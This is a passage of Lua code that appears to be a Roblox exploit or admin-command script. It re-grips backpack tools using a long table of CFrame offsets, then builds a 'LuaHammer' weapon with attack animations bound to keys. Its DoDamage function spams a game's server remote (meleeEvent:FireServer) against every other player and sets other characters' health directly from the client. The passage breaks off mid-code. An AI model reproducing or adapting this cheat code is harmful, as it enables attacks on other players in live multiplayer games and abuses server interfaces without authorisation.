CFrame.new(-1.7651629447937012, -1.0000005960464478, -2.234834909439087),
CFrame.new(3.7348363399505615, -2.699998140335083, 0.16516387462615967),
CFrame.new(2.7348344326019287, 1.5000015497207642, -2.234834909439087),
CFrame.new(1.7348341941833496, -4.4703583057525975e-08, -1.2348353862762451),
CFrame.new(3.7348344326019287, 1.000001311302185, -0.23483578860759735),
CFrame.new(1.2348361015319824, -4.999999523162842, -2.734834909439087),
CFrame.new(0.23483608663082123, -1.9999992847442627, -4.734835624694824),
CFrame.new(4.234834671020508, 0.000002339482307434082, -2.234834909439087),
CFrame.new(5.234835624694824, -2.999997854232788, -8.734833717346191),
CFrame.new(5.734834671020508, -3.9999985694885254, -3.234835147857666),
CFrame.new(-0.8651653528213501, 0.3669872283935547, 4.915163993835449),
CFrame.new(-0.8651653528213501, 0.7999997735023499, 5.165163993835449),
CFrame.new(1.2348361015319824, -2.6999990940093994, 1.1651639938354492),
CFrame.new(-0.7651668787002563, 2.9999992847442627, -4.234834671020508),
CFrame.new(1.2348361015319824, -2.6999990940093994, -1.8348363637924194),
CFrame.new(2.7348344326019287, 1.5000009536743164, 1.7651644945144653),
CFrame.new(-1.7651629447937012, -2.5000011920928955, 1.7651644945144653),
CFrame.new(0.23483513295650482, -4.4703497792397684e-08, -4.734834671020508),
CFrame.new(-0.7651630640029907, -1.500000238418579, -4.734834671020508),
CFrame.new(-1.7651629447937012, -2.5000011920928955, 2.765164613723755),
CFrame.new(5.234833717346191, 2.0000016689300537, -0.23483578860759735),
CFrame.new(-1.765164852142334, 0.4999992847442627, -4.734835624694824),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(4.734834671020508, 1.5000015497207642, -2.234834671020508),
CFrame.new(-0.8651653528213501, 0.4294092655181885, 10.148130416870117),
CFrame.new(5.234834671020508, -1.999997854232788, -0.23483578860759735),
CFrame.new(5.734834671020508, -2.49999737739563, -8.734833717346191),
CFrame.new(0.23483513295650482, 1.5000009536743164, -2.234834909439087),
CFrame.new(3.2348344326019287, 0.0000011473892982394318, -4.734834671020508),
CFrame.new(-1.7651629447937012, -3.000000476837158, -4.234835624694824),
CFrame.new(4.234836578369141, -2.699997663497925, -0.8348362445831299),
CFrame.new(0.23483513295650482, 0.5, -4.734834671020508),
CFrame.new(3.134834051132202, 1.2330135107040405, 5.415163993835449),
CFrame.new(-2.7651665210723877, 2.9999983310699463, -3.234834671020508),
CFrame.new(-1.7651629447937012, -1.5000011920928955, 0.7651643753051758),
CFrame.new(0.13483475148677826, 0.3669872283935547, 4.915163993835449),
CFrame.new(5.234833717346191, 1.5000009536743164, 0.7651643753051758),
CFrame.new(2.2348344326019287, -1.4999991655349731, -4.734834671020508),
CFrame.new(4.134834289550781, 1.670591950416565, 5.682201385498047),
CFrame.new(2.7348344326019287, 4.3213358935645374e-07, -1.2348353862762451),
CFrame.new(5.734835624694824, -4.499998569488525, -3.234835147857666),
CFrame.new(-1.265164852142334, 0.5000002384185791, 1.7651644945144653),
CFrame.new(4.734834671020508, 1.0000017881393433, -0.23483578860759735),
CFrame.new(3.134834051132202, 1.9294105768203735, 6.648129463195801),
CFrame.new(-0.7651630640029907, -4.707106590270996, -7.527728080749512),
CFrame.new(-1.7651629447937012, -2.700000047683716, 0.16516387462615967),
CFrame.new(1.2348341941833496, 1.0000003576278687, -0.23483578860759735),
CFrame.new(1.2348361015319824, -2.9999992847442627, -3.234834909439087),
CFrame.new(1.2348341941833496, 0.4999997615814209, -1.2348353862762451),
CFrame.new(4.234834671020508, 0.000002339482307434082, 0.7651643753051758),
CFrame.new(0.23483704030513763, -2.6999990940093994, 1.1651639938354492),
CFrame.new(4.234834671020508, 0.0000016242265701293945, -4.734834671020508),
CFrame.new(3.7348344326019287, 1.5000009536743164, -4.734834671020508),
CFrame.new(1.2348361015319824, -2.9999992847442627, -4.234835624694824),
CFrame.new(0.13483475148677826, 0.4294092655181885, 10.148130416870117),
CFrame.new(-2.265164613723755, 1.9999991655349731, -4.234834671020508),
CFrame.new(4.234834671020508, 0.500002384185791, 0.7651643753051758),
CFrame.new(5.234835624694824, -2.6999971866607666, -0.8348362445831299),
CFrame.new(5.234832763671875, 2.5000011920928955, 2.7651655673980713),
CFrame.new(0.23483704030513763, -5.000000476837158, -3.234835147857666),
CFrame.new(-1.7651629447937012, -3.0000009536743164, -3.734835147857666),
CFrame.new(3.2348363399505615, -2.9999988079071045, -3.234834909439087),
CFrame.new(1.2348361015319824, -2.4999992847442627, -4.734835624694824),
CFrame.new(1.2348341941833496, 1.5000009536743164, -3.2348344326019287),
CFrame.new(4.234834671020508, 1.000001311302185, 3.7651658058166504),
CFrame.new(-1.265164852142334, -0.49999964237213135, -1.2348353862762451),
CFrame.new(0.13483475148677826, 1.9294092655181885, 8.148130416870117),
CFrame.new(-1.265164852142334, 1.999998688697815, 0.7651643753051758),
CFrame.new(-1.765164852142334, 1.9999982118606567, -1.234834909439087),
CFrame.new(4.234834671020508, 1.5000009536743164, 1.7651644945144653),
CFrame.new(5.234834671020508, -2.499997854232788, -1.2348358631134033),
CFrame.new(1.134833812713623, 0.800000011920929, 5.165163040161133),
CFrame.new(4.234834671020508, -0.49999797344207764, 2.765164613723755),
CFrame.new(3.2348344326019287, -0.49999868869781494, -4.734834671020508),
CFrame.new(-2.265164613723755, 1.9999982118606567, -1.234834909439087),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(-1.765164852142334, 0.9999991059303284, -0.23483578860759735),
CFrame.new(1.7348341941833496, 1.5000009536743164, 0.7651643753051758),
CFrame.new(4.734834671020508, 1.5000009536743164, 1.7651644945144653),
CFrame.new(-1.765164852142334, 0.4999985694885254, 3.2651658058166504),
CFrame.new(4.234834671020508, 2.5000016689300537, 3.765164852142334),
CFrame.new(4.734834671020508, 0.5000019073486328, -4.734834671020508),
CFrame.new(-0.8651653528213501, 1.9294092655181885, 7.148129940032959),
CFrame.new(-1.7651629447937012, -2.000000238418579, -2.234834909439087),
CFrame.new(0.23483513295650482, 1.0000003576278687, -4.734834671020508),
CFrame.new(1.7348341941833496, 1.5000009536743164, -2.234834909439087),
CFrame.new(4.234834671020508, 2.5000016689300537, -4.234834671020508),
CFrame.new(1.2348361015319824, -4.70710563659668, -7.527728080749512),
CFrame.new(5.734833717346191, 1.0000020265579224, -2.234834909439087),
CFrame.new(-1.765164852142334, 2.4999988079071045, -1.234834909439087),
CFrame.new(4.134834289550781, 1.2330139875411987, 5.415163993835449),
CFrame.new(4.234836578369141, -2.699997663497925, -1.8348363637924194),
CFrame.new(5.734834671020508, -1.4999977350234985, -8.734833717346191),
CFrame.new(4.234834671020508, 1.5000009536743164, -3.234834671020508),
CFrame.new(3.2348363399505615, -2.9999988079071045, -3.234834909439087),
CFrame.new(2.2348344326019287, 0.5000007152557373, -4.734834671020508),
CFrame.new(-1.265164852142334, 1.4999984502792358, 0.7651643753051758),
CFrame.new(1.7348341941833496, 1.0000001192092896, -1.2348353862762451),
CFrame.new(-1.7651629447937012, -3.000000476837158, -8.734833717346191),
CFrame.new(5.234834671020508, -2.4999983310699463, 0.7651643753051758),
CFrame.new(1.2348341941833496, 0.9999998211860657, -1.2348353862762451),
CFrame.new(3.2348344326019287, 1.000001311302185, -8.734833717346191),
CFrame.new(0.23483704030513763, -2.999999761581421, -3.734834909439087),
CFrame.new(-0.7651649713516235, 1.5, -4.234834671020508),
CFrame.new(-1.765164852142334, 0.4999992847442627, -4.734834671020508),
CFrame.new(-1.265164852142334, 1.999998688697815, 2.765164613723755),
CFrame.new(2.134834051132202, 1.9294100999832153, 6.648129463195801),
CFrame.new(4.234836578369141, -2.9999983310699463, -3.234834909439087),
CFrame.new(-1.7651629447937012, -2.500000238418579, -2.234835147857666),
CFrame.new(-2.7651665210723877, 2.9999983310699463, 0.7651643753051758),
CFrame.new(-0.7651649713516235, 0.9999998211860657, -4.734834671020508),
CFrame.new(3.2348344326019287, 1.5000020265579224, -0.23483578860759735),
CFrame.new(-1.265164852142334, 2.4999988079071045, 2.7651655673980713),
CFrame.new(-2.765164613723755, 0.9999988675117493, -0.23483578860759735),
CFrame.new(0.7348369359970093, -2.6999990940093994, 0.16516387462615967),
CFrame.new(-0.7651649713516235, 0.4999997615814209, -4.734834671020508),
CFrame.new(5.234835624694824, -2.999997854232788, -4.234834671020508),
CFrame.new(-1.2651629447937012, -2.700000047683716, 1.1651639938354492),
CFrame.new(-0.7651649713516235, -2.8312206268310547e-07, -4.734834671020508),
CFrame.new(0.23483704030513763, -2.6999990940093994, -0.8348362445831299),
CFrame.new(0.13483475148677826, 1.9294092655181885, 8.648130416870117),
CFrame.new(5.234834671020508, -0.9999982714653015, -0.23483578860759735),

}

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2 then


v.Grip = Handles[i-1] 
v.Parent = game.Players.LocalPlayer.Character
end
end 

end)
--same cmd finished
AddCmd('LuaHammer','',function()
local oc = oc or function(...) return ... end

function weld(p0,p1,c0,c1,par)
local w = Instance.new("Weld",p0 or par)
w.Part0 = p0
w.Part1 = p1
w.C0 = c0 or CFrame.new()
w.C1 = c1 or CFrame.new()
return w
end

function lerp(a, b, t)
    return a + (b - a)*t
end

do
        local function QuaternionFromCFrame(cf) local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() local trace = m00 + m11 + m22 if trace > 0 then local s = math.sqrt(1 + trace) local recip = 0.5/s return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 else local i = 0 if m11 > m00 then i = 1 end if m22 > (i == 0 and m00 or m11) then i = 2 end if i == 0 then local s = math.sqrt(m00-m11-m22+1) local recip = 0.5/s return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip elseif i == 1 then local s = math.sqrt(m11-m22-m00+1) local recip = 0.5/s return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip elseif i == 2 then local s = math.sqrt(m22-m00-m11+1) local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip end end end
         
        local function QuaternionToCFrame(px, py, pz, x, y, z, w) local xs, ys, zs = x + x, y + y, z + z local wx, wy, wz = w*xs, w*ys, w*zs local xx = x*xs local xy = x*ys local xz = x*zs local yy = y*ys local yz = y*zs local zz = z*zs return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) end
         
        local function QuaternionSlerp(a, b, t) local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] local startInterp, finishInterp; if cosTheta >= 0.0001 then if (1 - cosTheta) > 0.0001 then local theta = math.acos(cosTheta) local invSinTheta = 1/math.sin(theta) startInterp = math.sin((1-t)*theta)*invSinTheta finishInterp = math.sin(t*theta)*invSinTheta  else startInterp = 1-t finishInterp = t end else if (1+cosTheta) > 0.0001 then local theta = math.acos(-cosTheta) local invSinTheta = 1/math.sin(theta) startInterp = math.sin((t-1)*theta)*invSinTheta finishInterp = math.sin(t*theta)*invSinTheta else startInterp = t-1 finishInterp = t end end return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp        end

        function clerp(a,b,t)
                local qa = {QuaternionFromCFrame(a)}
                local qb = {QuaternionFromCFrame(b)}
                local ax, ay, az = a.x, a.y, a.z
                local bx, by, bz = b.x, b.y, b.z

                local _t = 1-t
                return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t))
        end
end
local his = {}

function ctween(tar,prop,c2,t,b)
        local function doIt()
        local now = tick()
        his[tar] = now
        local c1 = tar[prop]
        for i=1,t do
                if his[tar] ~= now then return end
                tar[prop] = clerp(c1,c2,1/t*i)
                wait(1/60)
        end
        end
        if b then coroutine.wrap(doIt)() else doIt() end
end

function tickwave(time,length,offset)
        return (math.abs((tick()+(offset or 0))%time-time/2)*2-time/2)/time/2*length
end

function playSound(id,parent,volume,pitch)
        local sound = Instance.new("Sound",parent or workspace)
        sound.SoundId = "http://www.roblox.com/asset?id="..id
        sound.Volume = volume or 1
        sound.Pitch = pitch or 1
        coroutine.wrap(function()
                wait()
                sound:Play()
                wait(10)
                sound:Stop()
                sound:Destroy()
        end)()
        return sound
end

local plr = game.Players.LocalPlayer
local char = plr.Character
local mouse = plr:GetMouse()

local nk = char.Torso.Neck
local nk0 = CFrame.new(0,1,0) * CFrame.Angles(-math.pi/2,0,math.pi)
local ra,la = char["Right Arm"], char["Left Arm"]
ra:BreakJoints()
la:BreakJoints()
local rs = weld(char.Torso,ra,CFrame.new(1.25,.5,0), CFrame.new(-.25,.5,0),stuff)
local ls = weld(char.Torso,la,CFrame.new(-1.25,.5,0), CFrame.new(.25,.5,0),stuff)
ls.Part1.FrontSurface = "Hinge"
rs.Part1.FrontSurface = "Hinge"
local rs0 = rs.C0
local ls0 = ls.C0

local color1 = BrickColor.new("Dark gray")
local color2 = BrickColor.new("Navy blue")

local stuff = Instance.new("Model",char)
pcall(function() char["Hammur"]:Destroy() end)
stuff.Name = "Hammur"
wait(.5)
local handle = Instance.new("Part")
handle.FormFactor = "Custom"
handle.BrickColor = color1
handle.Reflectance = .25
handle.Size = Vector3.new(.5,5,.5)
handle.TopSurface = "Smooth"
handle.BottomSurface = "Smooth"
handle.CanCollide = false
handle.Parent = stuff

local grip = weld(char["Right Arm"],handle,CFrame.new(0,-.95,0)*CFrame.Angles(math.rad(-90),0,0),CFrame.new(0,-1.4,0)) 
local grip0 = grip.C0
local hamend = handle:Clone()
Instance.new("BlockMesh",hamend)
hamend.Parent = stuff
hamend.Size = Vector3.new(2,2,3.5)
local hamwel = weld(handle,hamend,CFrame.new(0,3,0))
local hamsd1 = hamend:Clone()
hamsd1.Mesh.Scale = Vector3.new(1,1,1)
hamsd1.Parent = stuff
hamsd1.Size = Vector3.new(2.3,2.3,.3)
weld(hamend,hamsd1,CFrame.new(0,0,1.75))
local hamsd2 = hamsd1:Clone()
hamsd2.Parent = stuff
weld(hamend,hamsd2,CFrame.new(0,0,-1.75))
local hamp = hamsd1:Clone()
hamp.Parent = stuff
hamp.Size = Vector3.new(.2,.2,3.5)
weld(hamend,hamp,CFrame.new(.95,.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.95,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,.95,0))
hamp = hamp:Clone()
hamp.BrickColor = color2
hamp.Reflectance = .2
hamp.Size = Vector3.new(.2,.2,2.5)
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.95,0,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,0,0))
hamp = handle:Clone()
hamp.BrickColor = color2
hamp.Reflectance = .2
hamp.Parent = stuff
hamp.Size = Vector3.new(.4,.2,.4)
Instance.new("CylinderMesh",hamp)
weld(hamend,hamp,CFrame.new(0,-.955,1.2))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,-.955,-1.2))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,.955,1.2))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(0,.955,-1.2))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.955,0,-1.2) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.955,0,1.2) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.955,0,-1.2) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.955,0,1.2) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.6,.955,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.6,.955,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.6,-.955,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.6,-.955,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.955,.6,0) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.955,-.6,0) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.955,.6,0) * CFrame.Angles(0,0,math.rad(90)))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.955,-.6,0) * CFrame.Angles(0,0,math.rad(90)))
local luacyl = hamp:Clone()
luacyl.BrickColor = BrickColor.Blue()
luacyl.Parent = stuff
luacyl.Mesh.Scale = Vector3.new(1,.2,1)
luacyl.Size = Vector3.new(2,.2,2)
weld(hamsd1,luacyl,CFrame.new(0,0,.14) * CFrame.Angles(math.rad(90),0,0))
hamp = luacyl:Clone()
hamp.BrickColor = BrickColor.White()
hamp.Parent = stuff
hamp.Size = Vector3.new(.7,.2,.7)
weld(luacyl,hamp,CFrame.new(.35,.01,-.35))
local luamoon = luacyl:Clone()
luamoon.Parent = stuff
luamoon.Size = Vector3.new(.7,.2,.7)
local mnw = weld(luacyl,luamoon,CFrame.new(1.2,.02,-1.2))
for r = 1,180,10 do
        local r2 = 2 * (math.pi/180*r)
        local l = hamsd1:Clone()
        l.Parent = stuff
        l.BrickColor = luacyl.BrickColor
        l.Size = Vector3.new(.3,.2,.2)
        l.Mesh.Scale = Vector3.new(1,.3,.3)
        weld(luacyl,l,CFrame.new(Vector3.new(math.sin(r2)*1.7,0,math.cos(r2)*1.7),Vector3.new()))
end
hamp = hamend:Clone()
hamp.BrickColor = color2
hamp.Reflectance = .2
hamp.Size = Vector3.new(.2,.2,3.5)
hamp.Mesh.Scale = Vector3.new(.25,.25,1)
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-1.05,.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,1.05,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(1.05,.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.95,1.05,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(1.05,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(.95,-1.05,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-1.05,-.95,0))
hamp = hamp:Clone()
hamp.Parent = stuff
weld(hamend,hamp,CFrame.new(-.95,-1.05,0))
for x = -1,1 do
for y = -1,1 do
hamp = hamp:Clone()
hamp.Mesh.Scale = Vector3.new(1,1,1)
hamp.Size = Vector3.new(.5,.5,.2)
hamp.Parent = stuff
weld(hamsd2,hamp,CFrame.new(x*.7,y*.7,-.1))
end
end

rs.C0 = rs0 * CFrame.Angles(math.rad(70),math.rad(50),math.rad(-20))
ls.C0 = ls0 * CFrame.new(.4,.2,-.3) * CFrame.Angles(math.rad(110),math.rad(0),math.rad(00)) * CFrame.Angles(0,math.rad(60),0)

function endScript()
        pcall(function() runcon:disconnect() end)
        pcall(function() kdcon:disconnect() end)
        pcall(function() kucon:disconnect() end)
        pcall(game.Destroy,stuff)
        pcall(game.Destroy,bg)
        pcall(game.Destroy,bv)
end

local spintime = 3
local idling = true

runcon = game:GetService("RunService").Stepped:connect(oc(function()
        if not stuff:IsDescendantOf(workspace) then
                endScript()
        end
        local an = (tick()%spintime)*360/spintime
        mnw.C0 = CFrame.Angles(0,math.rad(an),0) * CFrame.new(0,.04,1.7)
        if idling then
                rs.C0 = clerp(rs.C0,rs0 * CFrame.Angles(math.rad(70+tickwave(3,5)),math.rad(50),math.rad(-20)),.4)
                ls.C0 = clerp(ls.C0,ls0 * CFrame.new(.4,.2,-.3) * CFrame.Angles(math.rad(115+tickwave(3,5)),math.rad(0),math.rad(-5)) * CFrame.Angles(0,math.rad(60),0),.4)
                nk.C0 = clerp(nk.C0,nk0 * CFrame.Angles(tickwave(4,-.1),0,0),.4)
                grip.C0 = clerp(grip.C0,grip0,.4)
        end
end))

function cfot(tar,cf,t)
        coroutine.wrap(function()
                for i=1,t do
                        tar.CFrame = tar.CFrame * cf
                        wait(1/30)
                end
        end)()
end

function DoDamage(hum,dmg)
        if hum.Health == 0 then   for i, plr in pairs(game.Players:GetChildren()) do
                        if plr.Name ~= game.Players.LocalPlayer.Name then
                        for i = 1, 10 do
                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                        end
        end
end return end
        local a,b = ypcall(function()
                --hum:TakeDamage(dmg)
                hum.Health = hum.Health - dmg
                if not hum.Parent:FindFirstChild("Torso") then return end
                local m = Instance.new("Model",workspace)
                m.Name = -dmg
                local h = Instance.new("Humanoid",m)
                h.MaxHealth = 0
                local p = Instance.new("Part",m)
                p.Name = "Head"
                p.FormFactor = "Custom"
                p.Size = Vector3.new(.2,.2,.2)
                p.Transparency = 0.97
                p.CanCollide = false
                p.Anchored = true
                p:BreakJoints()
                game.Debris:AddItem(m,5)
                p.CFrame = CFrame.new(hum.Parent.Torso.Position) * CFrame.new(math.random(-2,2),2.5,math.random(-2,2))
                local rAm = math.random(3,6)/100
                coroutine.wrap(function()
                for i=1,300 do 
                p.CFrame = p.CFrame * CFrame.new(0,rAm,0) 
                wait()
                end 
                p:Destroy()
                end)()
        end)
        if not a then print(b) end
end

local atdeb = false
local basiccombo = 0
local basiccombotimer = 0
bg = Instance.new("BodyGyro",char.Torso)
bg.maxTorque = Vector3.new(1,0,1)*9e10
bg.P = 10000
bg.D = 500
bv = Instance.new("BodyVelocity",char.Torso)
bv.maxForce = Vector3.new()
bv.P = 50000

kucon = mouse.KeyUp:connect(oc(function(k)
        if k == "0" and sprint then
                pcall(function() char.Humanoid.WalkSpeed = char.Humanoid.WalkSpeed / 1.5 end)
                sprint = false
        end
end))

kdcon = mouse.KeyDown:connect(oc(function(k)
        if k == "0" and not sprint then
                pcall(function() char.Humanoid.WalkSpeed = char.Humanoid.WalkSpeed * 1.5 end)
                sprint = true
        end
        if k == "f" then
                if atdeb then return end
                atdeb = true
                idling = false
                playSound(105374058,hamend,1,1)
             ---   bg.cframe = char.Torso.CFrame * CFrame.Angles(math.rad(7),0,0)
               -- ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(-20),0,0),7,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(150),math.rad(0),math.rad(-90)),7)
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(160),math.rad(0),math.rad(30)),13,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(-35),0,0),13,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(160),math.rad(0),math.rad(60)),13)
                playSound(92597296,hamend,1,1.07)
                local s = playSound(96626016,hamend)
                s.Volume = 0
                local hitcon
                hitcon = hamend.Touched:connect(function(hit)
                        s.Volume = 1
                        if not hit.Anchored then
                                hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*-20
                        end
                        local hum = hit.Parent:FindFirstChild("Humanoid")
                        if hum and not hum:IsDescendantOf(char) then
                                DoDamage(hum,30)
                                hum.PlatformStand = true
                                wait(.6)
                                hum.PlatformStand = false
                        end
                end)
                bg.maxTorque = Vector3.new(1,1,1)*9e10
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(35),math.rad(0),math.rad(30)),4,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(35),0,0),4,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(35),math.rad(0),math.rad(-30)),4)
                if workspace:FindPartOnRay(Ray.new(hamend.Position,hamend.CFrame.lookVector*3),char) then
                        s.Volume = 1
                end
                wait(.2)
                bg.maxTorque = Vector3.new(1,0,1)*9e10
                hitcon:disconnect()
                atdeb = false
                idling = true
        end
        if k == "q" then
                if atdeb then return end
                atdeb = true
                idling = false
                playSound(105374058,hamend,1,1)
                bg.cframe = char.Torso.CFrame * CFrame.Angles(math.rad(7),0,0)
                ctween(grip,"C0",grip0*CFrame.Angles(math.rad(-30),math.rad(-25),math.rad(-15)),9,true)
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(150),math.rad(0),math.rad(30)),7,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(-20),0,0),7,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(150),math.rad(0),math.rad(-30)),7)
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(160),math.rad(0),math.rad(30)),13,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(-35),0,0),13,true)
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(160),math.rad(0),math.rad(-30)),13)
                playSound(92597296,hamend,1,1.07)
                local s = playSound(96626016,hamend)
                s.Volume = 0
                local hitcon
                hitcon = hamend.Touched:connect(function(hit)
                        s.Volume = 1
                        if not hit.Anchored then
                                hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*-20
                        end
                        local hum = hit.Parent:FindFirstChild("Humanoid")
                        if hum and not hum:IsDescendantOf(char) then
                                DoDamage(hum,30)
                                hum.PlatformStand = true
                                wait(.6)
                                hum.PlatformStand = false
                        end
                end)
                bg.cframe = char.Torso.CFrame * CFrame.Angles(math.rad(7),0,0)
                wait(.05)
                bg.cframe = char.Torso.CFrame * CFrame.Angles(math.rad(-20),0,0)
                bg.maxTorque = Vector3.new(1,1,1)*9e10
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(55),math.rad(5),math.rad(50)),7,true)
                ctween(nk,"C0",nk0 * CFrame.Angles(math.rad(5),0,0),4,true)
                ctween(rs,"C0",rs0*CFrame.new(-.9,0,-.9) * CFrame.Angles(math.rad(50),math.rad(5),math.rad(-50)),7)
                if workspace:FindPartOnRay(Ray.new(hamend.Position,hamend.CFrame.lookVector*3),char) then
                        s.Volume = 1
                end
                wait(.2)
                bg.maxTorque = Vector3.new(1,0,1)*9e10
                hitcon:disconnect()
                atdeb = false
                idling = true
        end
        if k == "r" then
                if atdeb then return end
                atdeb = true
                idling = false
                ctween(ls,"C0",ls0*CFrame.new(.7,0,-.7) * CFrame.Angles(math.rad(70),math.rad(0),math.rad(30)),7,true)
                ctween(grip,"C0",grip0*CFrame.Angles(math.rad(0),math.rad(90),math.rad(-60))*CFrame.Angles(0,math.rad(180),0),9,true)
                bg.maxTorque = Vector3.new(1,1,1)*9e10
                bg.cframe = char.Torso.CFrame
                ctween(rs,"C0",rs0*CFrame.new(-.7,0,-.7) * CFrame.Angles(math.rad(70),math.rad(0),math.rad(-30)),7,true)
                local s = playSound(92597296,hamend,1,1.07)
                s.Looped = true
                local sndmd = {}
                local hitcon
                hitcon = hamend.Touched:connect(function(hit)
                        if not sndmd[hit] then sndmd[hit] = playSound(10730819,hamend) end
                        
                        if not hit.Anchored then
                                hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*60
                        end
                        local hum = hit.Parent:FindFirstChild("Humanoid")
                        if hum and not hum:IsDescendantOf(char) then
                                DoDamage(hum,math.random(4,6))
                                hum.Sit = true
                                wait(2)
                                hum.Sit = false
                        end
                end)
                for i=1,20 do
                        bg.cframe = bg.cframe * CFrame.Angles(0,math.rad(-1440/20),0)
                        wait(.1)
                end
                hitcon:disconnect()
                bg.maxTorque = Vector3.new(1,0,1)*9e10
                s:Stop()
                s:Destroy()
                atdeb = false
                idling = true
        end
        if k == "e" then
                if atdeb then return end
                basiccombo = (tick()-basiccombotimer > .5 or basiccombo == 2) and 1 or basiccombo + 1
                idling = false
                atdeb = true
                if basiccombo == 1 then
                        ctween(ls,"C0",ls0 * CFrame.new(.2,.2,-.1) * CFrame.Angles(math.rad(120),math.rad(0),math.rad(5)) * CFrame.Angles(0,math.rad(60),0),7,true)
                        ctween(rs,"C0",rs0*CFrame.new(0,0,-.3) * CFrame.Angles(math.rad(120),math.rad(70),math.rad(-30)),7)
                        bg.maxTorque = Vector3.new(1,1,1)*9e10
                        bg.cframe = char.Torso.CFrame * CFrame.Angles(0,math.rad(-40),0)
                        playSound(92597296,hamend,1,1.2)
                        local ac
                        local hitcon
                        hitcon = hamend.Touched:connect(function(hit)
                                if not ac then ac = playSound(10730819,hamend,1,1) end
                                if not hit.Anchored then
                                        hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*50
                                end
                                local hum = hit.Parent:FindFirstChild("Humanoid")
                                if hum and not hum:IsDescendantOf(char) then
